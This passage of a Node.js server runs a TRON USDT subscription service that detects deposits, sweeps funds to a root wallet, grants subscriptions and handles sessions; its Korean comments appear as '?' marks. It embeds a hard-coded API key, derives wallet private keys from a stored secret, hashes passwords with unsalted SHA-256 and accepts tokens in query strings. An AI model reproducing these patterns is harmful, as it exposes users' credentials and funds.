  }
}

const TRX_CONFIRM_WAIT_MS = 20_000; // TRX ?? ? ?? (ms)

async function autoSweepAndGrant(depositAddress, userId, managerId, usdtBalance) {
  console.log(`[AUTO-SWEEP] ??: addr=${depositAddress} user=${userId} usdt=${usdtBalance}`);
  try {
    // 1. ?? ?? ??
    const activeWallet = await db.collectionWalletDB.getActive();
    if (!activeWallet?.xpub_key) {
      console.warn('[AUTO-SWEEP] ?? ??/??? ?? ? ??'); return;
    }
    const rootAddress = activeWallet.root_wallet_address;

    // 2. ?? / ???? ??? ?? (??? ?? ? xpub ??)
    let rootPrivKey, depositPrivKey;
    try {
      rootPrivKey = deriveRootPrivateKey(activeWallet.xpub_key);
    } catch (e) {
      console.error('[AUTO-SWEEP] ? ?? ??? ?? ??:', e.message);
      console.error('[AUTO-SWEEP] ??  ??? ??? > ???? xpub ?? ???(12-24??)?? ??? ??!');
      return;
    }
    const [[addrRow]] = await db.pool.query(
      'SELECT derivation_index FROM deposit_addresses WHERE deposit_address = ?',
      [depositAddress]
    );
    if (!addrRow) { console.warn('[AUTO-SWEEP] deposit_addresses ? ??'); return; }
    try {
      depositPrivKey = deriveTronPrivateKey(activeWallet.xpub_key, addrRow.derivation_index);
    } catch (e) {
      console.error('[AUTO-SWEEP] ? ???? ??? ?? ??:', e.message);
      return;
    }

    const { TronWeb } = require('tronweb');
    const tronRoot = new TronWeb({ fullHost: TRON_FULL_HOST, privateKey: rootPrivKey });

    // ?? ??? ?? vs DB ?? ?? ?? ??
    const derivedRootAddr = tronRoot.defaultAddress.base58;
    if (derivedRootAddr !== rootAddress) {
      console.error(`[AUTO-SWEEP] ? ?? ?? ???!`);
      console.error(`  DB root_wallet_address : ${rootAddress}`);
      console.error(`  ??? ???0 ?? ?? : ${derivedRootAddr}`);
      console.error(`  ? ??? ????? root_wallet_address? ${derivedRootAddr} ? ????? ?? ??? ???? ??????.`);
      return;
    }
    console.log(`[AUTO-SWEEP] ? ?? ?? ??: ${rootAddress}`);

    const TRON_KEY = process.env.TRONGRID_API_KEY || 'c2b82453-208b-4607-9222-896e921990cb';

    // 2.5. ?? ?? ?? USDT ?? ?? (TRX ??? ?? ?? ?? ? ?? ??)
    let depositUsdtActual = 0;
    try {
      const depAcctResp = await axios.get(
        `https://api.trongrid.io/v1/accounts/${depositAddress}`,
        { headers: { 'TRON-PRO-API-KEY': TRON_KEY }, params: { only_confirmed: true }, timeout: 10000 }
      );
      const trc20 = depAcctResp.data?.data?.[0]?.trc20 || [];
      const entry = trc20.find(b => {
        const k = Object.keys(b)[0];
        return k && k.toLowerCase() === USDT_CONTRACT.toLowerCase();
      });
      depositUsdtActual = entry ? Number(Object.values(entry)[0]) / 1e6 : 0;
    } catch (e) {
      console.warn('[AUTO-SWEEP] ???? USDT ?? ?? ??:', e.message);
    }
    if (depositUsdtActual < 0.1) {
      console.log(`[AUTO-SWEEP] ???? ??? ?? (${depositUsdtActual.toFixed(4)} USDT) ? swept ?? ? ??`);
      await db.depositAddressDB.updateStatus(depositAddress, 'swept');
      return;
    }
    console.log(`[AUTO-SWEEP] ???? ??? ??: ${depositUsdtActual.toFixed(4)} USDT`);

    // 3. ?? ?? TRX ?? ?? (TronGrid REST API ?? ? publicnode? getBalance? ??? ???? ?? ??)
    let rootTrxBalance = 0;
    try {
      const balResp = await axios.get(
        `https://api.trongrid.io/v1/accounts/${rootAddress}`,
        { headers: { 'TRON-PRO-API-KEY': TRON_KEY }, timeout: 10000 }
      );
      rootTrxBalance = (balResp.data?.data?.[0]?.balance || 0) / 1e6;
    } catch (e) {
      console.error('[AUTO-SWEEP] TRX ?? ?? ??:', e.message);
      return;
    }
    // 4. ??? TRX ?? ??
    const trxNeeded = await calcTrxNeeded();
    if (rootTrxBalance < trxNeeded + 5) {
      console.error(`[AUTO-SWEEP] ?? ?? TRX ??: ${rootTrxBalance} TRX (?? ${trxNeeded + 5})`);
      return;
    }

    // 4-b. ?? ??? TRX ???
    console.log(`[AUTO-SWEEP] ${depositAddress}? ${trxNeeded} TRX ?? ?... (???)`);
    const sendResult = await tronRoot.trx.sendTransaction(depositAddress, TronWeb.toSun(trxNeeded));
    console.log(`[AUTO-SWEEP] TRX ?? txID: ${sendResult?.txid || sendResult?.transaction?.txID || JSON.stringify(sendResult).slice(0,80)}`);

    // 5. TRX ?? ?? ?? (?? 90? = 6? ? 15?)
    // ? ?? ?? ?? ?? ?? ???? ???? ??
    const TRX_CHECK_INTERVAL = 6000;
    const TRX_CHECK_MAX = 15;
    let trxConfirmed = false;
    for (let i = 0; i < TRX_CHECK_MAX; i++) {
      await new Promise(r => setTimeout(r, TRX_CHECK_INTERVAL));
      try {
        const chkResp = await axios.get(
          `https://api.trongrid.io/v1/accounts/${depositAddress}`,
          { headers: { 'TRON-PRO-API-KEY': TRON_KEY }, timeout: 8000 }
        );
        const depTrxBal = (chkResp.data?.data?.[0]?.balance || 0) / 1e6;
        console.log(`[AUTO-SWEEP] TRX ?? ?? ${i + 1}/${TRX_CHECK_MAX}: ${depTrxBal} TRX`);
        if (depTrxBal >= 1) { trxConfirmed = true; break; }
      } catch (_) { /* ??? ?? ?? */ }
    }
    if (!trxConfirmed) {
      console.error('[AUTO-SWEEP] ? TRX ??? (90? ??) ? ?? ???? ???');
      return; // paid ?? ?? ? ?? ???? ???
    }

    // 6. ?? ??? USDT sweep
    const tronDeposit = new TronWeb({ fullHost: TRON_FULL_HOST, privateKey: depositPrivKey });
    const contract = await tronDeposit.contract().at(USDT_CONTRACT);
    const balanceRaw = await contract.balanceOf(depositAddress).call();
    const sweepAmount = Number(balanceRaw) / 1e6;

    if (sweepAmount < 0.1) {
      console.warn(`[AUTO-SWEEP] USDT ??: ${sweepAmount} ? ??`); return;
    }

    const txId = await contract.transfer(rootAddress, Number(balanceRaw)).send({ feeLimit: 40_000_000 });
    await db.depositAddressDB.updateStatus(depositAddress, 'swept');
    // txId? ??/undefined/null ? ? ???? ?? string?? ??
    const txIdStr = String(txId?.txid || txId?.transaction?.txID || (typeof txId === 'string' ? txId : '') || 'unknown');
    console.log(`[AUTO-SWEEP] ? ?? ?? ${sweepAmount} USDT ? ${rootAddress} | txId=${txIdStr}`);

    // 7. ?? ?? ?? & ??
    const days = await calcDaysFromUsdt(usdtBalance);
    const newExpiry = await db.userDB.extendSubscription(userId, days);
    const newExpiryDate = newExpiry instanceof Date ? newExpiry : new Date(newExpiry);
    console.log(`[AUTO-SWEEP] ? ?? ${days}? ?? ? user=${userId} ??=${newExpiryDate.toISOString()}`);

    // 7-b. ?? ?? ?? ??
    if (managerId) {
      try {
        const [[mgr]] = await db.pool.query('SELECT settlement_rate FROM managers WHERE id = ?', [managerId]);
        const rate = Number(mgr?.settlement_rate) || 0;
        if (rate > 0) {
          const settlementAmount = sweepAmount * rate / 100;
          const [[{ cnt }]] = await db.pool.query(
            'SELECT COUNT(*) as cnt FROM settlements WHERE user_id = ?', [userId]
          );
          const paymentType = Number(cnt) > 0 ? 'renewal' : 'new';
          await db.pool.query(
            `INSERT INTO settlements (manager_id, user_id, payment_amount, settlement_rate, settlement_amount, payment_type)
             VALUES (?, ?, ?, ?, ?, ?)`,
            [managerId, userId, sweepAmount, rate, settlementAmount, paymentType]
          );
          console.log(`[AUTO-SWEEP] ? ?? ?? managerId=${managerId} rate=${rate}% amount=${settlementAmount.toFixed(4)} USDT`);
        }
      } catch (e) {
        console.error('[AUTO-SWEEP] ?? ?? ??:', e.message);
      }
    }

    // ??? locale ?? ???? ?? (?? locale ??)
    const expiryStr = `${newExpiryDate.getFullYear()}-${String(newExpiryDate.getMonth()+1).padStart(2,'0')}-${String(newExpiryDate.getDate()).padStart(2,'0')}`;
    const nowStr = new Date().toISOString().slice(0, 19).replace('T', ' ');

    // 8. ???? ?? (??? + ???) ? ?? ??? ??? HTML ??
    const msg =
      `? <b>?? ?? ??!</b>\n\n` +
      `?? ??: <code>${escapeHtml(userId)}</code>\n` +
      `?? ??: <b>${sweepAmount.toFixed(2)} USDT</b>\n` +
      `?? ??: <b>${days}?</b> (??: ${escapeHtml(expiryStr)})\n` +
      `?? ??: <code>${escapeHtml(rootAddress)}</code>\n` +
      `?? TxID: <code>${escapeHtml(txIdStr.slice(0, 30))}</code>\n` +
      `?? ${escapeHtml(nowStr)} UTC`;

    console.log(`[AUTO-SWEEP] telegram managerId=${managerId}`);

    if (managerId) {
      await sendManagerTelegramByChannel(managerId, 'deposit', msg);
    }
    await sendMasterTelegramChannel('deposit', msg);
    const _mc = await getMasterTgConfig();
    if (!_mc.botToken || !_mc.chatDeposit) {
      console.warn('[AUTO-SWEEP] master deposit telegram channel not configured');
    }

  } catch (e) {
    console.error('[AUTO-SWEEP] ??:', e.message || e);
  }
}

// ---------- ?? ?? ?? + ?? ??? ?? ----------
async function autoSweepAndBulkGrant(session) {
  console.log(`[BULK-SWEEP] ??: id=${session.id} total=${session.total_usdt} USDT`);
  try {
    const activeWallet = await db.collectionWalletDB.getActive();
    if (!activeWallet?.xpub_key) { console.warn('[BULK-SWEEP] ?? ??/??? ??'); return; }
    const rootAddress = activeWallet.root_wallet_address;

    let rootPrivKey, depositPrivKey;
    try { rootPrivKey = deriveRootPrivateKey(activeWallet.xpub_key); }
    catch (e) { console.error('[BULK-SWEEP] ??? ?? ??:', e.message); return; }
    try { depositPrivKey = deriveTronPrivateKey(activeWallet.xpub_key, session.derivation_index); }
    catch (e) { console.error('[BULK-SWEEP] ????? ?? ??:', e.message); return; }

    const { TronWeb } = require('tronweb');
    const TRON_KEY = process.env.TRONGRID_API_KEY || 'c2b82453-208b-4607-9222-896e921990cb';
    const tronRoot = new TronWeb({ fullHost: TRON_FULL_HOST, privateKey: rootPrivKey });
    if (tronRoot.defaultAddress.base58 !== rootAddress) {
      console.error('[BULK-SWEEP] ?? ?? ???'); return;
    }

    // ??? ??
    let depositUsdt = 0;
    try {
      const r = await axios.get(`https://api.trongrid.io/v1/accounts/${session.deposit_address}`,
        { headers: { 'TRON-PRO-API-KEY': TRON_KEY }, timeout: 10000 });
      const trc20 = r.data?.data?.[0]?.trc20 || [];
      const e = trc20.find(b => Object.keys(b)[0]?.toLowerCase() === USDT_CONTRACT.toLowerCase());
      depositUsdt = e ? Number(Object.values(e)[0]) / 1e6 : 0;
    } catch (_) {}
    if (depositUsdt < 0.1) {
      await db.pool.query(`UPDATE bulk_payment_sessions SET status='complete' WHERE id=?`, [session.id]);
      return;
    }

    // TRX ??? ?? (??? ??)
    let rootTrxBal = 0;
    try {
      const r = await axios.get(`https://api.trongrid.io/v1/accounts/${rootAddress}`,
        { headers: { 'TRON-PRO-API-KEY': TRON_KEY }, timeout: 10000 });
      rootTrxBal = (r.data?.data?.[0]?.balance || 0) / 1e6;
    } catch (_) {}
    if (rootTrxBal >= 2) {
      await tronRoot.trx.sendTransaction(session.deposit_address, Math.floor(2 * 1e6));
      console.log(`[BULK-SWEEP] TRX 2? ? ${session.deposit_address}`);
    }
    // TRX ?? ?? (?? 90?)
    const TRX_CHECK_MAX = 9; const TRX_CHECK_INTERVAL = 10000;
    for (let i = 0; i < TRX_CHECK_MAX; i++) {
      await new Promise(r => setTimeout(r, TRX_CHECK_INTERVAL));
      try {
        const r = await axios.get(`https://api.trongrid.io/v1/accounts/${session.deposit_address}`,
          { headers: { 'TRON-PRO-API-KEY': TRON_KEY }, timeout: 8000 });
        if ((r.data?.data?.[0]?.balance || 0) / 1e6 >= 1) break;
      } catch (_) {}
    }

    // USDT sweep
    const tronDep = new TronWeb({ fullHost: TRON_FULL_HOST, privateKey: depositPrivKey });
    const contract = await tronDep.contract().at(USDT_CONTRACT);
    const balRaw = await contract.balanceOf(session.deposit_address).call();
    const sweepAmt = Number(balRaw) / 1e6;
    if (sweepAmt < 0.1) { await db.pool.query(`UPDATE bulk_payment_sessions SET status='complete' WHERE id=?`, [session.id]); return; }
    await contract.transfer(rootAddress, Number(balRaw)).send({ feeLimit: 40_000_000 });
    console.log(`[BULK-SWEEP] ? ${sweepAmt} USDT ? ${rootAddress}`);

    // ?? ??? ??
    const entries = JSON.parse(session.entries || '[]');
    const targetDate = session.target_date instanceof Date
      ? session.target_date
      : new Date(session.target_date + 'T00:00:00');
    const tgtStr = `${targetDate.getFullYear()}-${String(targetDate.getMonth()+1).padStart(2,'0')}-${String(targetDate.getDate()).padStart(2,'0')}`;
    for (const e of entries) {
      if (!e.userId || !(e.days > 0)) continue;
      await db.pool.query(
        `UPDATE users SET expire_date = ?, status = 'approved' WHERE id = ?`,
        [tgtStr, e.userId.toLowerCase()]
      );
      console.log(`[BULK-SWEEP] ? ${e.userId} ??? ? ${tgtStr}`);
    }

    await db.pool.query(`UPDATE bulk_payment_sessions SET status='complete' WHERE id=?`, [session.id]);
    console.log(`[BULK-SWEEP] ? ?? id=${session.id}`);

    try {
      const userList = entries.filter(e => e.days > 0).map(e => `<code>${escapeHtml(String(e.userId))}</code>`).join(', ');
      await sendMasterTelegramChannel(
        'deposit',
        `? <b>Bulk deposit processed</b>\n?? ${sweepAmt.toFixed(2)} USDT\n?? ${tgtStr}\n?? ${userList}`
      );
    } catch (_) {}
  } catch (e) {
    console.error('[BULK-SWEEP] ??:', e.message);
  }
}

// ---------- ?? ?? ??? ----------
// TronGrid ?? ??: 100,000?/? ? ?? ?? 90,000?
// 1,440?/? ? ?? ?? 62? ?? (90,000 / 1,440 = 62.5)
// 150ms ??? ? 62? ? 9.3?/? ?? ? 1? ?? ??
const TRONGRID_DAILY_BUDGET = Number(process.env.TRONGRID_DAILY_BUDGET) || 90000;
const CRON_MINUTES_PER_DAY = 1440;
const PER_RUN_LIMIT = Math.floor(TRONGRID_DAILY_BUDGET / CRON_MINUTES_PER_DAY); // 62
const REQUEST_DELAY_MS = 150; // ?? ~6?, TronGrid ?? ??(15?) ??

const ADDRESS_EXPIRE_HOURS = 1; // ?? ?? ?? ?? ??

let _depositCheckRunning = false;

cron.schedule('* * * * *', async () => {
  if (_depositCheckRunning) return; // ?? ??? ?? ??? ?? ?? skip
  _depositCheckRunning = true;
  try {
    // ?? 1?? ?? ??? ?? ?? ?? ??
    const [expireResult] = await db.pool.query(
      `UPDATE deposit_addresses
          SET status = 'expired'
        WHERE status IN ('issued', 'waiting_deposit')
          AND created_at < DATE_SUB(NOW(), INTERVAL ? HOUR)`,
      [ADDRESS_EXPIRE_HOURS]
    );
    if (expireResult.affectedRows > 0) {
      console.log(`[DEPOSIT-CHECK] ? ?? ??: ${expireResult.affectedRows}? ?? ? expired`);
    }

    const [addresses] = await db.pool.query(
      `SELECT da.deposit_address, da.user_id, u.manager_id, da.status
       FROM deposit_addresses da
       JOIN users u ON da.user_id = u.id
       WHERE da.status IN ('issued', 'waiting_deposit', 'expired', 'paid')
       ORDER BY da.created_at ASC
       LIMIT ?`,
      [PER_RUN_LIMIT]
    );
    if (addresses.length === 0) return;

    console.log(`[DEPOSIT-CHECK] ?? ? ??: ${addresses.length}? (?? ${PER_RUN_LIMIT}/?, ?? ${TRONGRID_DAILY_BUDGET}/?)`);

    const tronGridHeaders = { 'TRON-PRO-API-KEY': process.env.TRONGRID_API_KEY || 'c2b82453-208b-4607-9222-896e921990cb' };

    for (const addr of addresses) {
      try {
        // /v1/accounts/{addr}/transactions/trc20 ? USDT ?? ?? ?? ??
        // (account ?????? trc20 ??? ???? ??? ?? ? ??? ??)
        const txResp = await axios.get(
          `https://api.trongrid.io/v1/accounts/${addr.deposit_address}/transactions/trc20`,
          {
            params: { contract_address: USDT_CONTRACT, only_confirmed: true, limit: 20 },
            timeout: 10000,
            headers: tronGridHeaders,
          }
        );

        const txList = txResp.data?.data || [];

        // ?? ?? ?? USDT ?? ?? (?? ?? ?? ??? ?? ??? ??? ?? ???? ??) ??
        let actualUsdtBalance = 0;
        try {
          const acctResp = await axios.get(
            `https://api.trongrid.io/v1/accounts/${addr.deposit_address}`,
            { headers: tronGridHeaders, params: { only_confirmed: true }, timeout: 10000 }
          );
          const trc20List = acctResp.data?.data?.[0]?.trc20 || [];
          const usdtEntry = trc20List.find(b => {
            const key = Object.keys(b)[0];
            return key && key.toLowerCase() === USDT_CONTRACT.toLowerCase();
          });
          actualUsdtBalance = usdtEntry ? Number(Object.values(usdtEntry)[0]) / 1e6 : 0;
        } catch (e) {
          console.warn(`[DEPOSIT-CHECK] ??? ?? ?? (${addr.deposit_address}):`, e.message);
        }

        // ??? 0 + ???? ?? ? ??? ??? ??
        if (txList.length === 0 && actualUsdtBalance < 0.01) {
          await db.pool.query(
            `UPDATE deposit_addresses SET status = 'waiting_deposit'
             WHERE deposit_address = ? AND status = 'issued'`,
            [addr.deposit_address]
          );
          await new Promise(r => setTimeout(r, REQUEST_DELAY_MS));
          continue;
        }

        // ??? 0??? ???? ??? ?? ?? ?? ? ?? ???, DB ??
        if (actualUsdtBalance < 0.01 && addr.status === 'paid') {
          console.log(`[DEPOSIT-CHECK] ?? ${addr.deposit_address} ??? 0 (?? ?? ??) ? swept ??`);
          await db.depositAddressDB.updateStatus(addr.deposit_address, 'swept');
          await new Promise(r => setTimeout(r, REQUEST_DELAY_MS));
          continue;
        }

        const usdtBalance = actualUsdtBalance > 0.01 ? actualUsdtBalance
          : txList.filter(tx => tx.to === addr.deposit_address && tx.type === 'Transfer')
                  .reduce((sum, tx) => sum + Number(tx.value) / 1e6, 0);

        if (usdtBalance > 0) {
          const alreadyPaid = addr.status === 'paid';

          if (!alreadyPaid) {
            // ?? ?? ? ?? ?? + ???? ??
            await db.depositAddressDB.updateStatus(addr.deposit_address, 'paid');
            console.log(`[DEPOSIT-CHECK] ? ?? ?? userId=${addr.user_id} ${usdtBalance} USDT`);

            const msg =
              `?? <b>?? ??!</b>\n\n` +
              `?? ??: <code>${escapeHtml(addr.user_id)}</code>\n` +
              (addr.manager_id ? `????? ???: <code>${escapeHtml(addr.manager_id)}</code>\n` : '') +
              `?? ??: <b>${usdtBalance.toFixed(2)} USDT</b>\n` +
              `?? ??: <code>${escapeHtml(addr.deposit_address)}</code>\n` +
              `?? ??: ${escapeHtml(new Date().toLocaleString('ko-KR'))}`;

            if (addr.manager_id) {
              await sendManagerTelegramByChannel(addr.manager_id, 'deposit', msg);
            }
            await sendMasterTelegramChannel('deposit', msg);
          } else {
            // ?? paid ? ?? ??? ?
            console.log(`[DEPOSIT-CHECK] ?? ?? ??? userId=${addr.user_id} ${usdtBalance} USDT`);
          }

          // ?? ?? & ?? ?? (fire-and-forget, ?? ?? ? ?? ??? ???)
          autoSweepAndGrant(addr.deposit_address, addr.user_id, addr.manager_id, usdtBalance)
            .catch(e => console.error('[AUTO-SWEEP] ??:', e.message));
        }
      } catch (e) {
        console.error(`[DEPOSIT-CHECK] ${addr.deposit_address} ??:`, e.message);
      }
      await new Promise(r => setTimeout(r, REQUEST_DELAY_MS));
    }
    // ?? ?? ?? ?? ?? ??
    try {
      // 1?? ?? pending ?? ??
      await db.pool.query(
        `UPDATE bulk_payment_sessions SET status='expired'
         WHERE status='pending' AND created_at < DATE_SUB(NOW(), INTERVAL 1 HOUR)`
      );
      // pending ?? ?? (?? 10?)
      const [bulkList] = await db.pool.query(
        `SELECT * FROM bulk_payment_sessions WHERE status='pending' AND deposit_address IS NOT NULL LIMIT 10`
      );
      for (const sess of bulkList) {
        try {
          // TronGrid? ?? ?? USDT ?? ??
          const TRON_KEY = process.env.TRONGRID_API_KEY || 'c2b82453-208b-4607-9222-896e921990cb';
          const resp = await axios.get(
            `https://api.trongrid.io/v1/accounts/${sess.deposit_address}`,
            { headers: { 'TRON-PRO-API-KEY': TRON_KEY }, timeout: 8000 }
          );
          const trc20 = resp.data?.data?.[0]?.trc20 || [];
          const entry = trc20.find(b => {
            const k = Object.keys(b)[0];
            return k && k.toLowerCase() === USDT_CONTRACT.toLowerCase();
          });
          const bal = entry ? Number(Object.values(entry)[0]) / 1e6 : 0;
          if (bal >= Number(sess.total_usdt) * 0.98) { // 2% ?? ??
            console.log(`[BULK-SWEEP] ?? ?? token=${sess.id} bal=${bal} required=${sess.total_usdt}`);
            await db.pool.query(`UPDATE bulk_payment_sessions SET status='paid' WHERE id=?`, [sess.id]);
            autoSweepAndBulkGrant(sess).catch(e => console.error('[BULK-SWEEP] ??:', e.message));
          }
        } catch (e) { console.warn(`[BULK-CHECK] ${sess.id} ??:`, e.message); }
        await new Promise(r => setTimeout(r, REQUEST_DELAY_MS));
      }
    } catch (e) { console.error('[BULK-CHECK] ?? ??:', e.message); }
  } catch (e) {
    console.error('[DEPOSIT-CHECK] ??? ??:', e.message);
  } finally {
    _depositCheckRunning = false;
  }
});

// ---------- ?????? ?? ??? (DB ??) ----------
// ???? ??: ??? ??? ?? ?? ?? (?? 24??)
const SESSION_TIMEOUT = 24 * 60 * 60 * 1000; // 24?? (???)

const sessionStore = {
  // DB ?? ?? ??
  async save(userId, newToken) {
    try {
      // ?? ?? ??
      const [existingSessions] = await db.pool.query(
        'SELECT token FROM sessions WHERE user_id = ?',
        [userId]
      );
      
      const hadOldSession = existingSessions.length > 0;
      
      // ?? ?? ?? ? ? ?? ??
      await db.pool.query('DELETE FROM sessions WHERE user_id = ?', [userId]);
      await db.pool.query(
        'INSERT INTO sessions (user_id, token, last_activity) VALUES (?, ?, NOW())',
        [userId, newToken]
      );
      
      return hadOldSession; // ?? ??? ???? ??
    } catch (error) {
      console.error('?? ?? ??:', error);
      return false;
    }
  },
  
  async isValid(token) {
    try {
      const [rows] = await db.pool.query(
        'SELECT user_id, last_activity, kicked FROM sessions WHERE token = ?',
        [token]
      );
      
      if (rows.length === 0) return false;
      
      const session = rows[0];
      
      // kicked ?? ??
      if (session.kicked) return false;
      
      // ???? ?? (24??)
      const lastActivity = new Date(session.last_activity).getTime();
      const now = Date.now();
      
      if (now - lastActivity > SESSION_TIMEOUT) {
        // ?? ?? - ??
        await this.remove(session.user_id);
        return false;
      }
      
      // ???? ??: ?? ?? ??
      await db.pool.query(
        'UPDATE sessions SET last_activity = NOW() WHERE token = ?',
        [token]
      );
      
      return true;
    } catch (error) {
      console.error('?? ?? ??:', error);
      return false;
    }
  },
  
  async getUserId(token) {
    try {
      const [rows] = await db.pool.query(
        'SELECT user_id, last_activity FROM sessions WHERE token = ? AND kicked = FALSE',
        [token]
      );
      
      if (rows.length === 0) return null;
      
      const session = rows[0];
      
      // ???? ??
      const lastActivity = new Date(session.last_activity).getTime();
      if (Date.now() - lastActivity > SESSION_TIMEOUT) {
        await this.remove(session.user_id);
        return null;
      }
      
      // ????: ??? ??? ??
      await db.pool.query(
        'UPDATE sessions SET last_activity = NOW() WHERE token = ?',
        [token]
      );
      
      return session.user_id;
    } catch (error) {
      console.error('??? ID ?? ??:', error);
      return null;
    }
  },
  
  async remove(userId) {
    try {
      await db.pool.query('DELETE FROM sessions WHERE user_id = ?', [userId]);
    } catch (error) {
      console.error('?? ?? ??:', error);
    }
  },
  
  async kickUser(userId) {
    try {
      await db.pool.query(
        'UPDATE sessions SET kicked = TRUE WHERE user_id = ?',
        [userId]
      );
      // ?? ?? ? ?? ??? stopped? ?? ??
      await db.pool.query(
        `INSERT INTO miner_status (user_id, status, assigned_at)
         VALUES (?, 'stopped', NULL)
         ON DUPLICATE KEY UPDATE status = 'stopped', assigned_at = NULL`,
        [userId]
      );
    } catch (error) {
      console.error('?? ? ??:', error);
    }
  },
  
  async getAll() {
    try {
      const now = Date.now();
      const [rows] = await db.pool.query(
        'SELECT user_id, token, last_activity FROM sessions WHERE kicked = FALSE'
      );
      
      const result = [];
      const expiredUsers = [];
      
      for (const row of rows) {
        const lastActivity = new Date(row.last_activity).getTime();
        if (now - lastActivity > SESSION_TIMEOUT) {
          expiredUsers.push(row.user_id);
        } else {
          result.push({ userId: row.user_id, token: row.token });
        }
      }
      
      // ??? ?? ??
      if (expiredUsers.length > 0) {
        await db.pool.query(
          'DELETE FROM sessions WHERE user_id IN (?)',
          [expiredUsers]
        );
      }
      
      return result;
    } catch (error) {
      console.error('?? ?? ?? ??:', error);
      return [];
    }
  }
};

// ---------- ??? ??: token -> { role: 'master'|'manager', id } ----------
// ??? ?? ??? ??? (multer) ???
const _uploadDir = path.join(__dirname, 'public', 'uploads', 'popups');
if (!fs.existsSync(_uploadDir)) fs.mkdirSync(_uploadDir, { recursive: true });
const _popupStorage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, _uploadDir),
  filename:    (req, file, cb) => {
    const ext = path.extname(file.originalname) || '.jpg';
    cb(null, Date.now() + '_' + crypto.randomBytes(6).toString('hex') + ext);
  },
});
const _uploadPopup = multer({
  storage: _popupStorage,
  limits: { fileSize: 10 * 1024 * 1024 }, // 10MB
  fileFilter: (req, file, cb) => {
    if (/^image\//.test(file.mimetype)) cb(null, true);
    else cb(new Error('??? ??? ??? ?????.'));
  },
});

const adminSessions = new Map();
function createAdminToken() {
  return crypto.randomBytes(24).toString('hex');
}
function requireAdmin(req, res, next) {
  const token = req.headers.authorization?.replace(/^Bearer\s+/i, '') || req.query?.adminToken || '';
  const session = adminSessions.get(token);
  if (!session) {
    return res.status(401).json({ error: '???? ?????.' });
  }
  req.admin = session;
  next();
}
function requireMaster(req, res, next) {
  if (req.admin?.role !== 'master') {
    return res.status(403).json({ error: '???? ?????.' });
  }
  next();
}

// ?????(??) ?? ?? ????
async function requireSession(req, res, next) {
  const token = req.headers.authorization?.replace(/^Bearer\s+/i, '') || req.query?.token || req.body?.token || '';
  if (!token) return res.status(401).json({ error: '???? ?????.' });
  const userId = await sessionStore.getUserId(token);
  if (!userId) return res.status(401).json({ error: '??? ???????.' });
  req.userId = userId;
  req.sessionToken = token;
  next();
}

// ?? ?? ?? ?? ????
async function requireOwnerSession(req, res, next) {
  const token = req.headers.authorization?.replace(/^Bearer\s+/i, '') || req.query?.token || req.body?.token || '';
  if (!token) return res.status(401).json({ error: '???? ?????.' });
  try {
    // 1) account_owners ?? ?? ??
    const [[ownerSess]] = await db.pool.query(
      `SELECT s.owner_id, s.last_activity, o.name, o.telegram, o.manager_id
       FROM owner_sessions s JOIN account_owners o ON s.owner_id = o.id
       WHERE s.token = ?`, [token]
    );
    if (ownerSess) {
      if (Date.now() - new Date(ownerSess.last_activity).getTime() > 24 * 60 * 60 * 1000) {
        await db.pool.query('DELETE FROM owner_sessions WHERE token = ?', [token]);
        return res.status(401).json({ error: '??? ???????.' });
      }
      await db.pool.query('UPDATE owner_sessions SET last_activity = NOW() WHERE token = ?', [token]);
      req.owner = { id: ownerSess.owner_id, name: ownerSess.name, telegram: ownerSess.telegram, managerId: ownerSess.manager_id, role: 'owner' };
      return next();
    }
    // 2) admins(manager) ?? ??
    const [[mgrSess]] = await db.pool.query(
      `SELECT s.owner_id, s.last_activity, m.telegram
       FROM owner_sessions s JOIN managers m ON s.owner_id = m.id AND m.role = 'manager'
       WHERE s.token = ?`, [token]
    );
    if (!mgrSess) return res.status(401).json({ error: '??? ???????.' });
    if (Date.now() - new Date(mgrSess.last_activity).getTime() > 24 * 60 * 60 * 1000) {
      await db.pool.query('DELETE FROM owner_sessions WHERE token = ?', [token]);
      return res.status(401).json({ error: '??? ???????.' });
    }
    await db.pool.query('UPDATE owner_sessions SET last_activity = NOW() WHERE token = ?', [token]);
    req.owner = { id: mgrSess.owner_id, name: mgrSess.owner_id, telegram: mgrSess.telegram, managerId: null, role: 'manager' };
    next();
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
}

// ===== macroUser ?? ?? =====
function muHashPassword(pw) {
  return crypto.createHash('sha256').update(pw).digest('hex');
}
function muCreateToken() {
  return crypto.randomBytes(24).toString('hex');
}
async function requireMuAuth(req, res, next) {
  const token = req.headers.authorization?.replace(/^Bearer\s+/i, '') || req.query?.muToken || '';
  if (!token) return res.status(401).json({ error: '???? ?????.' });
  try {
    const [[session]] = await db.pool.query(
      `SELECT s.token, s.last_activity, u.id, u.name, u.login_id, u.role, u.status
       FROM mu_sessions s JOIN mu_users u ON s.user_id = u.id WHERE s.token = ?`, [token]
    );
    if (!session) return res.status(401).json({ error: '??? ???????.' });
    if (session.status !== 'active') return res.status(403).json({ error: '??? ?????.' });
    const lastActivity = new Date(session.last_activity).getTime();
    if (Date.now() - lastActivity > 24 * 60 * 60 * 1000) {
      await db.pool.query('DELETE FROM mu_sessions WHERE token = ?', [token]);
      return res.status(401).json({ error: '??? ???????. ?? ??????.' });
    }
    await db.pool.query('UPDATE mu_sessions SET last_activity = NOW() WHERE token = ?', [token]);
    req.muUser = { id: session.id, name: session.name, loginId: session.login_id, role: session.role };
    next();
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
}
function requireMuAdmin(req, res, next) {
  if (req.muUser?.role !== 'ADMIN') return res.status(403).json({ error: '??? ??? ?????.' });
  next();
}

// ---------- ???? ----------
app.use(cors());
app.use(express.json());

// API ?? ?? ????
// ?? ??? ?? ?? (?? ????? ??? ???? ?)
const SILENT_PATHS = [
  '/api/session/validate',
  '/api/seed',
  '/api/seed/history',
  '/api/user/subscription',
];
app.use('/api', (req, res, next) => {
  const isSilent = SILENT_PATHS.some(p => req.path === p || req.path.startsWith(p + '?'));
  if (isSilent) return next();

  const start = Date.now();
  const timestamp = new Date().toLocaleString('ko-KR');
  
  res.on('finish', () => {
    const duration = Date.now() - start;
    const logData = {
      timestamp,
      method: req.method,
      url: req.originalUrl,
      status: res.statusCode,
      duration: `${duration}ms`,
      ip: req.ip || req.connection.remoteAddress,
    };
    
    if ((req.method === 'POST' || req.method === 'PUT') && req.body) {
      const sanitizedBody = { ...req.body };
      if (sanitizedBody.password) sanitizedBody.password = '***';
      if (sanitizedBody.pw) sanitizedBody.pw = '***';
      if (sanitizedBody.phrase) sanitizedBody.phrase = '***';
      logData.body = sanitizedBody;
    }
    
    if (res.statusCode >= 500) {
